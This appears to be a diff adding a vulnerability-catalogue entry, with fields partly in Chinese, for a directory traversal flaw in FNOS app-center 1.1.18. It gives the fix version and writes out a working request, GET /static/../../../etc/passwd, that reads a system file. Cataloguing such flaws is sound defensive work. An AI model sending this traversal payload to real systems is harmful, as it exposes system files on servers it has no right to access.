@@ -1,0 +1,11 @@
+vendor = "FNOS"
+name = "FNOS app-center static 目录遍历漏洞"
+type = "目录遍历"
+path = "/static/"
+version = "1.1.18"
+detail = "GET /static/../../../etc/passwd HTTP/1.1 Host: target"
+fix = "升级至 >= 1.1.19"
+date = 20260301
+label = "nday"
+cve = "TVD-2026-04379"
+verifier = "AdySec"
